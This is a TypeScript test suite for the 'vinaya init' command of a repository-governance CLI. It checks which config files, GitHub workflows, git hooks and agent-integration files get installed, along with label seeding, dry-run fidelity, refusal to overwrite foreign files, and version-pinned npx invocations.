import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
import { execFileSync } from 'node:child_process'
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync
} from 'node:fs'
import { tmpdir } from 'node:os'
import { join, relative } from 'node:path'
import { DOC_OWNERS_PATH, LABELS, parseRegistry, VERDICT_MARKER_SOURCE, WAIVER_LABEL_REVIEW } from '@attalabs/aeg-core'
import { AGENT_VENDORS, type AgentVendor } from '../src/lib/agent-vendors.js'
import {
  ARCHIVIST_WORKFLOW_PATH,
  BODY_CHECKS_WORKFLOW_PATH,
  buildInitOps,
  CHECKS_FOLDER_PLACEHOLDER_PATH,
  CHECKS_WORKFLOW_PATH,
  CLI_DIST_ARTIFACT_NAME,
  CONFIG_PATH,
  DOCTRINE_POINTER_PATH,
  labelOps,
  MCP_JSON_PATH,
  ROLES_FOLDER_PLACEHOLDER_PATH,
  REVIEW_WORKFLOW_PATH,
  REVIEW_RETRIGGER_WORKFLOW_PATH,
  REVIEW_VERDICT_WORKFLOW_PATH,
  SETUP_BUN_SHA,
  starterConfig
} from '../src/lib/artifacts.js'
import { agentSkillPath, discoverRoleNames } from '../src/lib/agents-skills-emitter.js'
import { CLAUDE_COMMAND_PATH } from '../src/lib/claude-command-emitter.js'
import { CLAUDE_SETTINGS_PATH, CLAUDE_STOP_HOOK_SCRIPT_PATH } from '../src/lib/claude-stop-hook-emitter.js'
import { GEMINI_COMMAND_PATH } from '../src/lib/gemini-command-emitter.js'
import { resolveDoctrineRoot } from '../src/commands/doctrine.js'
import type { VendoredVinaya } from '../src/lib/self-host.js'
import { detectVendoredVinaya } from '../src/lib/self-host.js'
import type { InitDeps } from '../src/commands/init.js'
import { parseAgentsFlag, runInit, runInitProduct } from '../src/commands/init.js'
import { runEject } from '../src/commands/eject.js'
import type { EjectDeps } from '../src/commands/eject.js'
import { planInstall, renderInstallDiff } from '../src/lib/ops.js'
import type { LabelGateway } from '../src/lib/ops.js'

let root: string
let createdLabels: string[]

/**
 * This package's own version — what both invocation emitters pin to (the four
 * workflows via `vinayaRun`, the two git hooks via `hookRun`); the `VINAYA.md`
 * doctrine pointer is human-facing prose and deliberately unpinned. Formerly
 * described as the single thing every generated published-shape
 * invocation pins to (`ownVersion()` in lib/artifacts.ts), workflows and git
 * hooks alike (atta-labs/vinaya#86).
 */
const OWN_VERSION = (
  JSON.parse(readFileSync(join(import.meta.dir, '..', 'package.json'), 'utf-8')) as { version: string }
).version

/** The published invocation the generators emit, version pin included. */
const PUBLISHED_RUN = `npx --yes @attalabs/vinaya@${OWN_VERSION}`

function makeDeps(overrides: Partial<InitDeps> = {}): InitDeps {
  const labels: LabelGateway = {
    async exists() {
      return false
    },
    async create(name) {
      createdLabels.push(name)
    }
  }
  return {
    detectRepo: async () => ({ repoRoot: root, owner: 'acme', repo: 'widget' }),
    checkGhAuth: async () => true,
    labelGateway: () => labels,
    hookDirFor: () => '.husky',
    customHooksPath: async () => null,
    setHooksPath: async () => {},
    confirm: async () => true,
    ...overrides
  }
}

function ejectDeps(overrides: Partial<EjectDeps> = {}): EjectDeps {
  return {
    detectRepo: async () => ({ repoRoot: root, owner: 'acme', repo: 'widget' }),
    readHooksPath: async () => null,
    unsetHooksPath: async () => {},
    confirm: async () => true,
    ...overrides
  }
}

/** Recursive snapshot of the fixture tree: relative path → content. */
function snapshot(dir: string): Map<string, string> {
  const out = new Map<string, string>()
  const walk = (d: string) => {
    for (const name of readdirSync(d)) {
      const p = join(d, name)
      if (statSync(p).isDirectory()) walk(p)
      else out.set(relative(dir, p), readFileSync(p, 'utf-8'))
    }
  }
  walk(dir)
  return out
}

/** Capture process.stdout.write output during `fn`, returning the output. */
async function captureStdout(fn: () => Promise<unknown>): Promise<string> {
  const original = process.stdout.write.bind(process.stdout)
  let buf = ''
  process.stdout.write = ((chunk: string) => {
    buf += chunk
    return true
  }) as typeof process.stdout.write
  try {
    await fn()
  } finally {
    process.stdout.write = original
  }
  return buf
}

beforeEach(() => {
  root = join(tmpdir(), `vinaya-init-${Date.now()}-${Math.random().toString(36).slice(2)}`)
  mkdirSync(root, { recursive: true })
  // A pre-existing adopter file that must survive init and eject untouched.
  writeFileSync(join(root, 'README.md'), '# widget\n')
  createdLabels = []
})

afterEach(() => {
  rmSync(root, { recursive: true, force: true })
})

describe('vinaya init', () => {
  it('installs exactly the minimal manifest plus all three agent-vendor emitters (default --agents=all) on a clean repo', async () => {
    let rc = -1
    await captureStdout(async () => {
      rc = await runInit(['--yes'], makeDeps())
    })
    expect(rc).toBe(0)

    // The minimal manifest (2026-07-23 re-ruling, +doc-owners #665; the
    // workflows item grew to three with the archivist workflow #761, to four
    // with the review-verdict workflow — the comment half of the review gate
    // split into its own file so verdict comments can re-trigger the
    // required run — to five with vinaya-body-checks.yml, the same
    // pull_request_target trust boundary carrying body-bare-digits'
    // Changesets-release exemption, which a plain pull_request job cannot
    // safely resolve, and to six with vinaya-review-retrigger.yml (Issue
    // #402 O4) — the CI-green retrigger half of the review gate, split into
    // its own file for the same reason the verdict-comment half already
    // was: a `workflow_run`-only trigger there means it never reports a
    // `skipped` check-run against vinaya-review.yml's own head):
    // config + root VINAYA.md + six workflows (tracked) +
    // three hook stubs (pre-commit/pre-push/commit-msg, the last added by
    // Issue #63) + the .vinaya/doc-owners starter, PLUS — as of task 5
    // (#152) — the three agent-vendor emitters (tasks 2/3/4), installed by
    // default since `init`'s own `--agents` flag defaults to `all`. Nothing
    // else is written.
    const doctrineRoot = resolveDoctrineRoot()
    if (!doctrineRoot) throw new Error('no bundled doctrine found — this test requires the real aeg-root/')
    const agentSkillPaths = discoverRoleNames(doctrineRoot).map(agentSkillPath)
    expect(agentSkillPaths.length).toBeGreaterThan(0) // sanity: role discovery actually found something

    for (const p of [
      CONFIG_PATH,
      DOCTRINE_POINTER_PATH,
      CHECKS_WORKFLOW_PATH,
      REVIEW_WORKFLOW_PATH,
      REVIEW_RETRIGGER_WORKFLOW_PATH,
      REVIEW_VERDICT_WORKFLOW_PATH,
      ARCHIVIST_WORKFLOW_PATH,
      BODY_CHECKS_WORKFLOW_PATH,
      '.husky/pre-commit',
      '.husky/pre-push',
      '.husky/commit-msg',
      DOC_OWNERS_PATH,
      CHECKS_FOLDER_PLACEHOLDER_PATH,
      ROLES_FOLDER_PLACEHOLDER_PATH,
      ...agentSkillPaths,
      CLAUDE_COMMAND_PATH,
      CLAUDE_STOP_HOOK_SCRIPT_PATH,
      CLAUDE_SETTINGS_PATH,
      MCP_JSON_PATH,
      GEMINI_COMMAND_PATH
    ]) {
      expect(existsSync(join(root, p))).toBe(true)
    }
    expect(DOCTRINE_POINTER_PATH).toBe('VINAYA.md') // root placement, not governance/

    // Exhaustiveness: NOTHING outside the manifest lands. The cut artifacts
    // (governance/, GitHub templates, example scripts) must be absent.
    const tree = new Set(snapshot(root).keys())
    const expected = new Set([
      'README.md', // pre-existing adopter file
      CONFIG_PATH,
      DOCTRINE_POINTER_PATH,
      CHECKS_WORKFLOW_PATH,
      REVIEW_WORKFLOW_PATH,
      REVIEW_RETRIGGER_WORKFLOW_PATH,
      REVIEW_VERDICT_WORKFLOW_PATH,
      ARCHIVIST_WORKFLOW_PATH,
      BODY_CHECKS_WORKFLOW_PATH,
      '.husky/pre-commit',
      '.husky/pre-push',
      '.husky/commit-msg',
      DOC_OWNERS_PATH,
      CHECKS_FOLDER_PLACEHOLDER_PATH,
      ROLES_FOLDER_PLACEHOLDER_PATH,
      ...agentSkillPaths,
      CLAUDE_COMMAND_PATH,
      CLAUDE_STOP_HOOK_SCRIPT_PATH,
      CLAUDE_SETTINGS_PATH,
      MCP_JSON_PATH,
      GEMINI_COMMAND_PATH
    ])
    expect(tree).toEqual(expected)
    for (const gone of [
      'governance',
      'scripts/vinaya-checks',
      '.github/ISSUE_TEMPLATE/vinaya-task.md',
      '.github/pull_request_template.md'
    ]) {
      expect(existsSync(join(root, gone))).toBe(false)
    }

    // labels created-if-absent
    expect(createdLabels).toContain('vinaya/tier:0')
    expect(createdLabels).toContain('vinaya/needs:principal-input')
    // the full declared literal set, not just the tier + needs families
    // (Issue #54's 6-of-16 gap) — every `form: 'literal'` LABELS entry is
    // seeded, and the open-ended `tranche:` prefix family is not (its suffix
    // is unknowable at install time; it has its own creation path instead).
    for (const l of LABELS.filter((entry) => entry.form === 'literal')) {
      expect(createdLabels).toContain(l.id)
    }
    expect(createdLabels).not.toContain('vinaya/tranche:')
    // starter config ships no example checks (empty `checks`)
    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(cfg.checks).toEqual({})
    // manifest recorded in config
    expect(cfg.managed.version).toBe(3)
    expect(cfg.managed.files).toContain(CHECKS_WORKFLOW_PATH)
    expect(cfg.managed.files).toContain(DOCTRINE_POINTER_PATH)
    expect(cfg.managed.files).toContain(CHECKS_FOLDER_PLACEHOLDER_PATH)
    expect(cfg.managed.files).toContain(ROLES_FOLDER_PLACEHOLDER_PATH)
    expect(cfg.managed.blocks.some((b: { path: string }) => b.path === '.husky/pre-commit')).toBe(true)
    expect(cfg.managed.blocks.some((b: { path: string }) => b.path === CLAUDE_STOP_HOOK_SCRIPT_PATH)).toBe(true)
    expect(cfg.managed.files).toContain(CLAUDE_SETTINGS_PATH)
    // the --agents selection itself is persisted, default all three, sorted
    expect(cfg.managed.agents).toEqual([...AGENT_VENDORS].sort())
    // hooks are executable
    expect(statSync(join(root, '.husky/pre-commit')).mode & 0o111).not.toBe(0)
    expect(statSync(join(root, CLAUDE_STOP_HOOK_SCRIPT_PATH)).mode & 0o111).not.toBe(0)
  })

  it('labelOps() seeds every literal (non-prefix) label in the declared vocabulary — the 6-of-16 gap cannot silently reopen', () => {
    const literalLabelIds = LABELS.filter((l) => l.form === 'literal').map((l) => l.id)
    const seededNames = labelOps().map((op) => op.name)
    expect(new Set(seededNames)).toEqual(new Set(literalLabelIds))
  })

  it('re-running init on an already-initialized repo creates no label a second time — real create-if-absent idempotency', async () => {
    const existing = new Set<string>()
    const statefulLabels: LabelGateway = {
      async exists(name) {
        return existing.has(name)
      },
      async create(name) {
        existing.add(name)
        createdLabels.push(name)
      }
    }
    const deps = makeDeps({ labelGateway: () => statefulLabels })

    await captureStdout(async () => {
      await runInit(['--yes'], deps)
    })
    expect(createdLabels.length).toBe(labelOps().length)

    createdLabels = []
    await captureStdout(async () => {
      await runInit(['--yes'], deps)
    })
    expect(createdLabels).toEqual([]) // every label already exists — none re-created
  })

  it('hook stubs pin the exact installed version with --yes (npx cache-key regression)', () => {
    // A bare/`@latest`-spec npx cache entry does not satisfy `--no-install
    // @attalabs/vinaya` — on a fresh machine the first commit after init died
    // on npx's non-interactive cancel. The exact-version `--yes` pin is the
    // fix; this locks it.
    const hookOps = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    }).filter((op) => op.kind === 'managed-block' && /pre-(commit|push)/.test(op.path))
    expect(hookOps.length).toBe(2)
    for (const op of hookOps) {
      if (op.kind !== 'managed-block') continue
      expect(op.body).toContain(`${PUBLISHED_RUN} check`)
      expect(op.body).not.toContain('--no-install')
    }
  })

  it('both hook stubs pass --local — neither can satisfy a requiresOpenPr check before a PR exists', () => {
    // The bootstrap-deadlock fix: closes-n/test-plan need an open PR's real
    // body, and neither the commit nor the push that precedes opening one can
    // supply it. Found live: the first commit on a fresh task branch could
    // never land, because the generated pre-commit hook ran every check
    // unconditionally. `vinaya-checks.yml` (CI, pull_request-triggered) is
    // deliberately NOT asserted here — it must omit --local so these checks
    // run for real once a PR exists.
    const hookOps = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    }).filter((op) => op.kind === 'managed-block' && /pre-(commit|push)/.test(op.path))
    expect(hookOps.length).toBe(2)
    for (const op of hookOps) {
      if (op.kind !== 'managed-block') continue
      expect(op.body).toContain('check --all')
      expect(op.body).toContain('--local')
    }
  })

  it('--dry-run writes nothing but shows the exact content install would write', async () => {
    const before = snapshot(root)
    const out = await captureStdout(() => runInit(['--dry-run'], makeDeps()))
    const after = snapshot(root)
    expect(after).toEqual(before) // nothing written
    // dry-run diff shows the exact bytes a real install writes
    for (const op of buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })) {
      if (op.kind === 'create-file') expect(out).toContain(op.content.trimEnd().split('\n')[0] ?? '')
    }
    expect(out).toContain('nothing was written')
  })

  it('dry-run output byte-matches what install then writes (content artifacts)', async () => {
    await runInit(['--yes'], makeDeps())
    for (const op of buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })) {
      // vinaya.config.json is the one file whose bytes legitimately differ: the
      // ownership `managed` manifest is injected at apply time. Every other
      // create-file artifact is byte-identical to what the diff showed.
      if (op.kind === 'create-file' && op.path !== CONFIG_PATH) {
        expect(readFileSync(join(root, op.path), 'utf-8')).toBe(op.content)
      }
    }
    // config: seed portion is exactly the starter ruleset; only `managed` is added.
    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    const { managed, ...seed } = cfg
    expect(managed).toBeDefined()
    expect(seed).toEqual(starterConfig() as unknown as typeof seed)
  })

  it('aborting the confirmation writes nothing and exits clean', async () => {
    const before = snapshot(root)
    const rc = await runInit([], makeDeps({ confirm: async () => false }))
    expect(rc).toBe(0)
    expect(snapshot(root)).toEqual(before)
  })

  it('refuses without gh auth unless --dry-run', async () => {
    const rc = await runInit(['--yes'], makeDeps({ checkGhAuth: async () => false }))
    expect(rc).toBe(1)
    expect(existsSync(join(root, CONFIG_PATH))).toBe(false)
  })

  it('stops on a custom core.hooksPath rather than guessing', async () => {
    const rc = await runInit(['--yes'], makeDeps({ customHooksPath: async () => '.config/hooks' }))
    expect(rc).toBe(1)
    expect(existsSync(join(root, CONFIG_PATH))).toBe(false)
  })
})

describe('remoteless graceful-skip (spec D3)', () => {
  it('warns, skips labels, and still installs + prints the summary — no gh-auth requirement either', async () => {
    let ghAuthCalled = false
    const deps = makeDeps({
      detectRepo: async () => ({ repoRoot: root, owner: '', repo: '' }),
      checkGhAuth: async () => {
        ghAuthCalled = true
        return false // would fail the run if it were ever consulted
      }
    })

    let rc = -1
    const out = await captureStdout(async () => {
      rc = await runInit(['--yes'], deps)
    })

    expect(ghAuthCalled).toBe(false)
    expect(rc).toBe(0)
    expect(out).toContain('Vinaya installed')
    expect(out).not.toContain('vinaya/tier:0') // no label ops rendered

    // everything except labels still installed
    for (const p of [
      CONFIG_PATH,
      DOCTRINE_POINTER_PATH,
      CHECKS_WORKFLOW_PATH,
      REVIEW_WORKFLOW_PATH,
      '.husky/pre-commit'
    ]) {
      expect(existsSync(join(root, p))).toBe(true)
    }
    expect(createdLabels).toEqual([])
  })

  it('init product skips only the label (the one forge-reaching op) — the registry write is a pure local file op and still happens', async () => {
    await runInit(['--yes'], makeDeps())
    createdLabels = []
    const rc = await runInitProduct(
      ['mobile', '--yes'],
      makeDeps({ detectRepo: async () => ({ repoRoot: root, owner: '', repo: '' }) })
    )
    expect(rc).toBe(0)
    expect(createdLabels).toEqual([])
    expect(existsSync(join(root, '.vinaya/projects.md'))).toBe(true)
    expect(readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')).toContain('| mobile |')

    const config = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(config.projects).toEqual([{ name: 'mobile', path: '.' }])
  })

  it('init product appends both the registry row and the config entry, and re-running is idempotent (task 15, #44)', async () => {
    await runInit(['--yes'], makeDeps())
    const deps = makeDeps({ detectRepo: async () => ({ repoRoot: root, owner: '', repo: '' }) })

    const rc1 = await runInitProduct(['demo', '--path', 'apps/demo', '--yes'], deps)
    expect(rc1).toBe(0)

    const registryAfterFirst = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    expect(parseRegistry(registryAfterFirst)).toEqual([
      { name: 'demo', path: 'apps/demo', specsPath: 'apps/demo/specs/', statePath: null }
    ])
    const configAfterFirst = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(configAfterFirst.projects).toEqual([{ name: 'demo', path: 'apps/demo' }])

    const rc2 = await runInitProduct(['demo', '--path', 'apps/demo', '--yes'], deps)
    expect(rc2).toBe(0)

    const registryAfterSecond = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    const configAfterSecond = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(parseRegistry(registryAfterSecond)).toEqual(parseRegistry(registryAfterFirst))
    expect(configAfterSecond.projects).toEqual(configAfterFirst.projects)
  })
})

describe('never-clobber', () => {
  it('appends to a pre-existing hook and REFUSES a foreign workflow + root VINAYA.md', async () => {
    mkdirSync(join(root, '.husky'), { recursive: true })
    writeFileSync(join(root, '.husky/pre-commit'), '#!/usr/bin/env sh\nnpm run lint\n')
    mkdirSync(join(root, '.github/workflows'), { recursive: true })
    writeFileSync(join(root, CHECKS_WORKFLOW_PATH), 'name: not-ours\n')
    // A pre-existing root VINAYA.md is the new refuse-if-foreign collision case
    // (it replaces the PR-template collision the old manifest carried).
    writeFileSync(join(root, DOCTRINE_POINTER_PATH), '# my own notes\n')

    const out = await captureStdout(() => runInit(['--yes'], makeDeps()))

    // hook: adopter line kept, managed block appended
    const hook = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(hook).toContain('npm run lint')
    expect(hook).toContain('vinaya:managed:pre-commit')
    // foreign checks workflow: untouched, and REFUSE shown in the diff
    expect(readFileSync(join(root, CHECKS_WORKFLOW_PATH), 'utf-8')).toBe('name: not-ours\n')
    expect(out).toContain('REFUSE')
    expect(out).toContain(CHECKS_WORKFLOW_PATH)
    // foreign root VINAYA.md: untouched, and REFUSE shown in the diff
    expect(readFileSync(join(root, DOCTRINE_POINTER_PATH), 'utf-8')).toBe('# my own notes\n')
    expect(out).toContain(DOCTRINE_POINTER_PATH)
    // the non-foreign review workflow still installs
    expect(existsSync(join(root, REVIEW_WORKFLOW_PATH))).toBe(true)
  })

  it('appends the managed block to a pre-existing Claude Code Stop-hook script, keeping the adopter lines (Test Plan item 3)', async () => {
    mkdirSync(join(root, '.claude/hooks'), { recursive: true })
    writeFileSync(
      join(root, CLAUDE_STOP_HOOK_SCRIPT_PATH),
      '#!/usr/bin/env sh\necho "an adopter-authored Stop hook, unrelated to vinaya"\n',
      { mode: 0o755 }
    )

    const out = await captureStdout(() => runInit(['--yes'], makeDeps()))

    const script = readFileSync(join(root, CLAUDE_STOP_HOOK_SCRIPT_PATH), 'utf-8')
    expect(script).toContain('an adopter-authored Stop hook, unrelated to vinaya')
    expect(script).toContain('vinaya:managed:track-transcript')
    expect(out).toContain(`append managed block to ${CLAUDE_STOP_HOOK_SCRIPT_PATH}`)
  })

  it('REFUSES a foreign .claude/settings.json rather than merging into it — strict JSON has no comment/marker syntax to append safely', async () => {
    mkdirSync(join(root, '.claude'), { recursive: true })
    const foreign = '{\n  "permissions": {\n    "allow": ["Bash(ls:*)"]\n  }\n}\n'
    writeFileSync(join(root, CLAUDE_SETTINGS_PATH), foreign)

    const out = await captureStdout(() => runInit(['--yes'], makeDeps()))

    expect(readFileSync(join(root, CLAUDE_SETTINGS_PATH), 'utf-8')).toBe(foreign)
    expect(out).toContain('REFUSE')
    expect(out).toContain(CLAUDE_SETTINGS_PATH)
    // the script still installs — the two artifacts refuse/append independently
    expect(existsSync(join(root, CLAUDE_STOP_HOOK_SCRIPT_PATH))).toBe(true)
  })

  it('REFUSES a foreign .vinaya/doc-owners rather than overwriting it', async () => {
    mkdirSync(join(root, '.vinaya'), { recursive: true })
    writeFileSync(join(root, DOC_OWNERS_PATH), '# adopter-authored bindings\napp/** docs/app.md\n')

    const out = await captureStdout(() => runInit(['--yes'], makeDeps()))

    expect(readFileSync(join(root, DOC_OWNERS_PATH), 'utf-8')).toBe('# adopter-authored bindings\napp/** docs/app.md\n')
    expect(out).toContain('REFUSE')
    expect(out).toContain(DOC_OWNERS_PATH)
  })
})

describe('workflows', () => {
  it('splits review authority into default-branch-only workflows', async () => {
    await runInit(['--yes'], makeDeps())
    const checks = readFileSync(join(root, CHECKS_WORKFLOW_PATH), 'utf-8')
    const review = readFileSync(join(root, REVIEW_WORKFLOW_PATH), 'utf-8')
    const verdict = readFileSync(join(root, REVIEW_VERDICT_WORKFLOW_PATH), 'utf-8')
    expect(checks).toContain('pull_request')
    expect(checks).not.toContain('issue_comment')
    const sigil = '$'
    // Authority half: pull_request_target + explicit default-branch checkout.
    // A PR must not choose either the workflow definition or executable code.
    expect(review).toContain('pull_request_target:')
    expect(review).not.toContain('\n  pull_request:\n')
    expect(review).toContain(`ref: ${sigil}{{ github.event.repository.default_branch }}`)
    expect(review).not.toContain(`ref: ${sigil}{{ github.event.pull_request.head.sha }}`)
    expect(review).not.toContain('refs/pull/')
    expect(review).not.toContain('issue_comment')
    // Verdict half: comment-triggered, VERDICT-guarded before checkout cost,
    // evaluator holds no write permission, retrigger re-runs the required run.
    expect(verdict).toContain('issue_comment')
    expect(verdict).toContain('VERDICT')
    expect(verdict).toContain('actions: write')
    expect(verdict).toContain('gh run rerun')
    expect(verdict).toContain('vinaya-review.yml')
    expect(verdict).toContain(`ref: ${sigil}{{ github.event.repository.default_branch }}`)
    expect(verdict).not.toContain(`ref: ${sigil}{{ steps.pr.outputs.sha }}`)
    expect(verdict).not.toContain('refs/pull/')
    // Assert the INVOCATION, pin included — not the bare subcommand string,
    // which also appears as the job's `name:` and would keep passing even if
    // the run step lost its invocation entirely.
    expect(checks).toContain(`${PUBLISHED_RUN} check --all --diff-only`)
    // PR_NUMBER wiring is what makes the review-gate adapter EVALUATE —
    // without it the check reads "local dev" and exits 0 unconditionally,
    // a vacuous gate (PR #813 review blocker). Guard all three PR-facing
    // workflows.
    expect(review).toContain('PR_NUMBER')
    expect(checks).toContain('PR_NUMBER')
    expect(verdict).toContain('PR_NUMBER')
    expect(verdict).toContain('steps.pr.outputs.number')
    // PR_BODY wiring is what makes test-plan/closes-n EVALUATE — neither
    // fetches the body itself, both read `process.env.PR_BODY` only, so an
    // unwired job passes them vacuously regardless of the PR's real content
    // (found live: reproduced against a real adopter repo's real CI run).
    // The checks job runs `check --all --diff-only` (test-plan/closes-n
    // included) and needs it, fetched live via `gh pr view` rather than the
    // event payload (a rerun of an old run must read the CURRENT body); the
    // review job runs only `check review-gate` now (#870), which never
    // reads PR_BODY, so it must NOT carry this wiring — re-adding it would
    // regress to the exact bug this fix closes.
    expect(checks).toContain('gh pr view "$PR_NUMBER" --json body --jq .body')
    expect(checks).not.toContain('github.event.pull_request.body')
    expect(review).not.toContain('github.event.pull_request.body')
    // review-gate is the review job's sole check (#870) — decoupled from the
    // PR_BODY-driven check --all it used to run.
    expect(review).toContain(`${PUBLISHED_RUN} check review-gate`)
    expect(review).not.toContain('check --all')
    // A body-only edit must re-trigger the checks workflow so test-plan/
    // closes-n re-evaluate against the corrected body (#870).
    expect(checks).toContain('edited')
    // Per-check step summary: the job's one check name names no check, so a
    // red run's guilty check must be readable on the run's Summary page.
    // pipefail guards the tee that captures it — the default run shell is
    // `bash -e` WITHOUT pipefail, so an unguarded pipe would report a red
    // suite green. `!cancelled()` (not `always()`): the concurrency group
    // cancels superseded runs routinely, and their half-captured output is
    // noise.
    expect(checks).toContain('GITHUB_STEP_SUMMARY')
    expect(checks).toContain('set -o pipefail')
    // `${'$'}` keeps the literal out of noTemplateCurlyInString's sights,
    // same dodge as the vendored describe's SIGIL helper.
    expect(checks).toContain(`if: ${'$'}{{ !cancelled() }}`)
  })

  it('the review gate re-runs itself when CI turns green (#399) — no hand rerun', async () => {
    await runInit(['--yes'], makeDeps())
    const review = readFileSync(join(root, REVIEW_WORKFLOW_PATH), 'utf-8')
    // The CI-green retrigger lives in its own workflow file (Issue #402 O4)
    // — never a second job inside vinaya-review.yml — so it never reports a
    // `skipped` check-run against that workflow's own `pull_request_target`
    // runs (see that check's own test for why: a `skipped` mechanical check
    // used to block every PR).
    const retrigger = readFileSync(join(root, REVIEW_RETRIGGER_WORKFLOW_PATH), 'utf-8')
    const verdict = readFileSync(join(root, REVIEW_VERDICT_WORKFLOW_PATH), 'utf-8')
    expect(review).not.toContain('workflow_run:')
    expect(retrigger).toContain('workflow_run:')
    expect(retrigger).toContain('workflows: [CI]')
    expect(retrigger).toContain('types: [completed]')
    expect(retrigger).toContain("github.event.workflow_run.conclusion == 'success'")
    // vinaya-review.yml triggers only on pull_request_target now — no
    // second event to guard the required job against.
    expect(review).not.toContain("if: github.event_name == 'pull_request_target'")
    // Reuses the exact rerun mechanism the verdict-comment retrigger uses:
    // the same display-title lookup against vinaya-review.yml's own runs,
    // then `gh run rerun`, tolerant of an already-queued/too-old run.
    expect(retrigger).toContain('gh run rerun')
    expect(retrigger).toContain('vinaya-review.yml')
    expect(retrigger).toContain('display_title == $title')
    expect(retrigger).toContain('rerun declined')
    expect(verdict).toContain('gh run rerun')
  })
})

// atta-labs/attalabs#929. In a repo whose workspaces glob reaches a member named
// `@attalabs/vinaya`, npm resolves `npx --yes @attalabs/vinaya` to that local
// member — the decision is made on the package NAME, before any version spec is
// read — and execs its unbuilt `bin`, so every generated job died with `sh:
// vinaya: command not found`. Both shapes are asserted here: a test that only
// asserted the old string was asserting the defect.
describe('generated workflows: published vs vendored invocation (atta-labs/attalabs#929)', () => {
  const WORKFLOWS = [
    CHECKS_WORKFLOW_PATH,
    REVIEW_WORKFLOW_PATH,
    REVIEW_RETRIGGER_WORKFLOW_PATH,
    REVIEW_VERDICT_WORKFLOW_PATH,
    ARCHIVIST_WORKFLOW_PATH
  ]
  const VENDORED_BIN = 'node apps/cli/dist/index.js'

  /** Make the fixture a repo that vendors the CLI as a workspace member. */
  function vendorVinaya(dir = 'apps/cli'): void {
    writeFileSync(
      join(root, 'package.json'),
      `${JSON.stringify({ name: 'vinaya', private: true, workspaces: ['apps/*', 'packages/*'] }, null, 2)}\n`
    )
    mkdirSync(join(root, dir), { recursive: true })
    writeFileSync(
      join(root, dir, 'package.json'),
      `${JSON.stringify(
        {
          name: '@attalabs/vinaya',
          version: '0.4.6',
          bin: { vinaya: './dist/index.js' },
          scripts: { build: 'bun scripts/build.ts' }
        },
        null,
        2
      )}\n`
    )
  }

  function generated(): Map<string, string> {
    return new Map(WORKFLOWS.map((p) => [p, readFileSync(join(root, p), 'utf-8')]))
  }

  /**
   * One `KEY: ${{ expression }}` env line. Assembled from `SIGIL` rather than
   * written inline so the literals here carry no `${`, which reads as a broken
   * JS template to the linter.
   */
  const SIGIL = '$'
  function expr(key: string, expression: string): string {
    return `${key}: ${SIGIL}{{ ${expression} }}`
  }

  function occurrences(files: Map<string, string>, needle: string): number {
    let n = 0
    for (const content of files.values()) n += content.split(needle).length - 1
    return n
  }

  it('ordinary adopter: published npx invocation everywhere, and NO build step', async () => {
    // The constraint: an adopter has no local copy to build and must not pay
    // for a problem they do not have.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

    expect(occurrences(files, `${PUBLISHED_RUN} `)).toBe(7)
    // …and none of them unpinned. An unpinned `npx` is NOT "latest". Where
    // the generated checks workflow carries an install step — only when the
    // adopter declares `ci.setup` — a repo carrying `@attalabs/vinaya` as a
    // devDependency resolves `node_modules/.bin/vinaya` instead of the
    // registry: measured 2026-08-17, the same bare command gave 0.8.2 inside
    // atta-labs/attalabs, which declares `ci.setup`, and 0.9.0 in /tmp. There
    // the CI version was an accident of a devDependency no workflow
    // referenced. With no `ci.setup` declared no install step is generated at
    // all, so a bare spec resolved registry latest (atta-labs/vinaya#86).
    expect(occurrences(files, 'npx --yes @attalabs/vinaya ')).toBe(0)
    expect(occurrences(files, 'npx --yes @attalabs/vinaya@latest')).toBe(0)
    expect(occurrences(files, 'node apps/cli/dist/index.js')).toBe(0)
    for (const content of files.values()) {
      expect(content).not.toContain('setup-bun')
      expect(content).not.toContain('bun install')
      expect(content).not.toContain('Build the vendored Vinaya CLI')
    }
  })

  it('every workflow and hook invocation is pinned, all to the generator’s own version', async () => {
    // The symmetry atta-labs/vinaya#86 restored. The two emitters share one
    // `ownVersion()`; a second version source appearing on either side would
    // let them drift, which is exactly the state that made an adopter's CI
    // version an untracked accident. Reading the version from the package
    // here — rather than hard-coding it — is what makes a drift visible.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const hooks = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    const specs: string[] = []
    for (const content of [...generated().values(), hooks]) {
      for (const m of content.matchAll(/npx --yes @attalabs\/vinaya@([^\s]+)/g)) specs.push(m[1] ?? '')
    }
    // Count, not just uniqueness: a set-only assertion would still pass if the
    // workflows lost their pin entirely and the hook alone contributed the
    // single value. Seven workflow invocations (O4, issue-545: the
    // archivist's post-merge job now also self-archives the tranche) plus
    // one hook.
    expect(specs).toHaveLength(8)
    expect([...new Set(specs)]).toEqual([OWN_VERSION])
  })

  it('the PR-triggered workflows carry a concurrency group — one run per PR', async () => {
    // `vinaya pr create` opens the PR and applies its tranche label straight
    // after, so `opened` and `labeled` arrive together and GitHub starts TWO
    // runs of the same workflow. Both report under one check name and the
    // merge box counts both, so one can go green while its twin holds a
    // stale red that no later verdict clears — measured live on
    // atta-labs/vinaya#18, two runs in the same second, one of each.
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const files = generated()

